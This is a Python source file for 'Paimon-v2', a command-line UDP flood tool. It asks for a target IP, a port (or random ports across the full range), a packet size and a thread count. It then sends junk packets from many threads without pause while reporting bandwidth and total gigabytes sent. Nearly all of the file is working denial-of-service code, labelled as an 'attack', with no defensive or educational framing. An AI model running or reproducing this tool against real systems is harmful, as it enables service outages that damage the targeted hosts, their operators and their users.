from getpass import getpass as hinput
from random import randint
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from time import time, sleep

from pystyle import *


class Paimon:

    def __init__(self, ip, port, force, threads):
        """
        :param ip: ipアドレス
        :param port: ポート番号
        :param force: パケットサイズ
        :param threads: スレッド数
        """
        self.on = None
        self.total = 0
        self.sent = 0
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(
                    f"{fluo}{round(size)} {white}Mb/s {cyan}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' ' * 20}"),
                    end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except Exception as e:
                print(f"An error occurred: {e}")

    def _randaddr(self):
        return self.ip, self._randport()

    def _randport(self):
        return self.port or randint(1, 65535)


title = r'''
________       _____                                    ______ 
___  __ \_____ ___(_)______ ________________     ___   ___|__ \
__  /_/ /  __ `/_  /__  __ `__ \  __ \_  __ \    __ | / /___/ /
_  ____// /_/ /_  / _  / / / / / /_/ /  / / /    __ |/ /_  __/ 
/_/     \__,_/ /_/  /_/ /_/ /_/\____//_/ /_/     _____/ /____/ 
'''

banner = r"""
　　　　　　　　　__　--=　￣￣／
　　　　 　　　,心ニニニﾆﾆ／､　 　 　 人
　　　 　　 ,心ニニニﾆﾆ／///乂＿_　　 Υ
　　　 　,心ニニニﾆﾆ／////／　､　　`丶　　 人
　　　,ｨ(ニ,斗ｬ七T爪////／　　　ヽ`～ 　 ＼Υ
　　　￣￣＼////////／　　　　　ﾉ:::::::{　　　＼＿＿_
　　　　　　　 冫─‐=≦　　　　　　 ｀`ヽ:::}　 　　＿_ノ
　　　　　　　/　　　　　　　　　　　　/＼　 V　　　 ＼
　　　   　 /　　　　　ハ　　　　　 / ＿＿ V　　　　 ＼＿
　　　　 　 人　　  　/＿__　　  / ／　＿　＼　 　 　 ＿ノ
　   _＿＿ノ　Υ　　 〃　　　＼　/ / ／ __　 ヽ　’　　　‘，
　  乂 　 　 　   /　／￣ヽ　Y-‘ {　 (＿_ノ　/　　　　}
　　　｀¨/　　　　 ∧ 乂 (__ノ　 }　乂＼__　/⌒ヽ      `
 　　 ＜_ノ　　　 圦乂＿＿__／(人) ｀    …/＿＿}　　   ’
　　　　　}　　 　 公s　　```　　　　　　 /......＼ /
　　　　　}　　　　　l＼≧=……ｭ-=ﾆﾆV.....∨         V
　　 　 　 ＼　 　　 ＼＿＿_／ニﾆﾆ√T^}. . . . ∧_ﾉ
　　　　　　　｀¨`～ __／ニニニ/7ﾆ/ノ乂乂＿/ /
　　　　　　　　　 ／⌒Vニニ／/ﾆ/　　　　 ＼
　　　　 　 　 　/..ヽ_／　 lﾆ/　　 　 　   ＼
"""

banner = Add.Add(title, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

cyan = Col.StaticMIX([Col.purple, Col.blue, Col.white])


def init():
    System.Size(140, 40), System.Title("Paimon-v2")
    Cursor.HideCursor()


init()


def stage(text, symbol='...'):
    col1 = cyan
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '[', ']')} {col2}{text}"


def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()


def main():
    print("PAIMON-v2")
    print(Colorate.Diagonal(Col.DynamicMIX([Col.cyan, Col.light_blue]), Center.XCenter(banner)))

    ip = input(stage(f"Enter the IP address {cyan}->{fluo2} ", '?'))
    print()

    try:
        parts = ip.split('.')
        if len(parts) != 4:
            raise ValueError("IP address must have four parts separated by dots.")

        for part in parts:
            number = int(part)
            if number < 0 or number > 255:
                raise ValueError("Each part of the IP address must be between 0 and 255.")

    except ValueError as e:
        error(f"Error! {e}")

    port = input(
        stage(f"Enter port {cyan}[{white}press {fluo2}enter{white} to attack all ports{cyan}] {cyan}->{fluo2} ",
              '?'))
    print()

    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(
        stage(f"Bytes per packet {cyan}[{white}press {fluo2}enter{white} for 1250{cyan}] {cyan}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")

    threads = input(
        stage(f"Threads {cyan}[{white}press {fluo2}enter{white} for 100{cyan}] {cyan}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")

    print()
    cport = '' if port is None else f'{cyan}:{fluo2}{port}'
    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')

    brute = Paimon(ip, port, force, threads)
    try:
        brute.flood()
    except OSError as e:
        brute.stop()
        error(f"An OS error has occurred: {e}")
    except Exception as e:
        brute.stop()
        error(f"A fatal error has occurred: {e}")

    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(
            f"Attack stopped. {fluo2}{ip}{cport}{white} was sent {fluo}{round(brute.total, 1)} {white}Gb.",
            '.'))
        print('\n')
        sleep(1)

        hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))
        exit(0)


if __name__ == '__main__':
    main()
